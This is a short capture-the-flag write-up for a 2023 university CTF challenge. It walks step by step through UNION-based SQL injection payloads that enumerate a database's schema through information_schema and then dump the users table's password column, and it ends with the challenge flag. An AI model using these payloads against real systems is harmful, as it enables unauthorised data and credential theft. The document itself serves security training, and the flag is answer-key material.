# Unveiling the Dark Wizard's Secrets

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/65e7c18a-383d-471c-95da-33c16adb101b)

## Solution

So for this challenge after I got know the database I search for the user voldemort 

The first payload is I want to search what inside the database
`123' UNION SELECT null, null, table_schema, null, null FROM information_schema.tables;-- -`

Then I go to sqlitraining using this payload
`123' UNION SELECT null, null, table_name, null, null FROM information_schema.tables WHERE table_schema = 'sqlitraining';-- -`

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/44e575af-6e5b-46b0-a00f-7371a2acf479)

Then I go to user using this `payload 123' UNION SELECT null, null, column_name, null, null FROM information_schema.columns WHERE table_name = 'users';-- -`

Then I go to 

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/00530a42-98d5-4a51-8205-b40d5cf7cf1c)

Password seem nice soo I go to the table using this payload `123' UNION SELECT null, null, password, null, null FROM users;-- -`

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/7200f227-2191-4fce-b567-deb18812a8b4)

Boom soo go back to the hint its says username and password of voldemort 

## Flag

CURTIN_CTF{872fc8ed4cae593dc5e62f00157b7db6}
